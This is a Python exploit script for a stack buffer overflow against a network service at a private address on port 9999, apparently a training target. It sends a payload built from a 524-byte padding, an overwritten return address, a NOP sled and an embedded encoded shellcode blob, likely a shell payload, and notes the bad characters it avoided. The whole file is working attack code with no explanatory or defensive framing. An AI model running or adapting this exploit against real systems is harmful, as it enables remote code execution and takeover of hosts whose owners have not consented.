import socket
import struct

s = socket.socket()
s.connect(('192.168.1.8',9999))

print(s.recv(1024))

all_char = ''.join(chr(i) for i in range(1,128)).encode()

#bad char : \x00\x80

buf =  b""
buf += b"\xb8\x6d\xc0\xe3\xb3\xda\xce\xd9\x74\x24\xf4\x5d\x31"
buf += b"\xc9\xb1\x59\x83\xed\xfc\x31\x45\x10\x03\x45\x10\x8f"
buf += b"\x35\x1f\x5b\xc0\xb6\xe0\x9c\xbe\x3f\x05\xad\xec\x24"
buf += b"\x4d\x9c\x20\x2e\x03\x2d\xcb\x62\xb0\xa6\xb9\xaa\x89"
buf += b"\x47\x32\x1c\xa3\x91\x7d\xa2\x98\xe2\x1c\x5e\xe3\x36"
buf += b"\xfe\x5f\x2c\x4b\xff\x98\xfa\x21\x10\x74\x76\x9b\xfe"
buf += b"\xf2\xca\x20\xa9\x05\x1b\xd3\x15\x7e\x1e\x24\xe1\x32"
buf += b"\x21\x75\x82\x93\x01\x74\x47\xa8\x0a\x6e\x37\x2a\x43"
buf += b"\xfa\x8b\x05\xab\x4a\x78\x51\xd8\x4c\xa8\xab\x1e\xe2"
buf += b"\x95\x03\x93\xfa\xd2\xa4\x4c\x89\x28\xd7\xf1\x8a\xeb"
buf += b"\xa5\x2d\x1e\xeb\x0e\xa5\xb8\xcf\xaf\x6a\x5e\x84\xbc"
buf += b"\xc7\x14\xc2\xa0\xd6\xf9\x79\xdc\x53\xfc\xad\x54\x27"
buf += b"\xdb\x69\x3c\xf3\x42\x28\x98\x52\x7a\x2a\x44\x0a\xde"
buf += b"\x21\x67\x5d\x5e\xca\x77\x62\x02\x5c\xbb\xaf\xbd\x9c"
buf += b"\xd3\xb8\xce\xae\x7c\x13\x59\x82\xf5\xbd\x9e\x93\x12"
buf += b"\x3e\x70\x1b\x72\xc0\x71\x5b\x5a\x07\x25\x0b\xf4\xae"
buf += b"\x46\xc0\x04\x4e\x93\x7c\x0f\xd8\xdc\x28\x0e\x16\xb5"
buf += b"\x2a\x11\x37\x19\xa3\xf7\x67\xf1\xe3\xa7\xc7\xa1\x43"
buf += b"\x18\xa0\xab\x4c\x47\xd0\xd3\x87\xe0\x7b\x3c\x71\x58"
buf += b"\x14\xa5\xd8\x12\x85\x2a\xf7\x5e\x85\xa1\xfd\x9f\x48"
buf += b"\x42\x74\x8c\xbd\x35\x76\x4c\x3e\xd0\x76\x26\x3a\x72"
buf += b"\x21\xde\x40\xa3\x05\x41\xba\x86\x16\x86\x44\x57\x2e"
buf += b"\xfc\x73\xcd\x0e\x6a\x7c\x01\x8e\x6a\x2a\x4b\x8e\x02"
buf += b"\x8a\x2f\xdd\x37\xd5\xe5\x72\xe4\x40\x06\x22\x58\xc2"
buf += b"\x6e\xc8\x87\x24\x31\x33\xe2\x36\x36\xcb\x70\x11\x9f"
buf += b"\xa3\x8a\x21\x1f\x33\xe1\xa1\x4f\x5b\xfe\x8e\x60\xab"
buf += b"\xff\x04\x29\xa3\x8a\xc8\x9b\x52\x8a\xc0\x7a\xca\x8b"
buf += b"\xe7\xa6\xfd\xf6\x88\x59\xfe\x06\x81\x3d\xff\x06\xad"
buf += b"\x43\x3c\xd1\x94\x31\x03\xe1\xa2\x4a\x36\x44\x82\xc0"
buf += b"\x38\xda\xd4\xc0"



shellcode = buf
total = 5000
offset = 524
new_eip = struct.pack("<I",0x311712F3)
nop_sled = b'\x90'*15

payload = [
    b'A'*(offset),
    new_eip,
    nop_sled,
    shellcode,
    b'\x90'*(total-offset-4-len(nop_sled)-len(shellcode))
]

payload = b"".join(payload)

s.send(payload)
s.close()
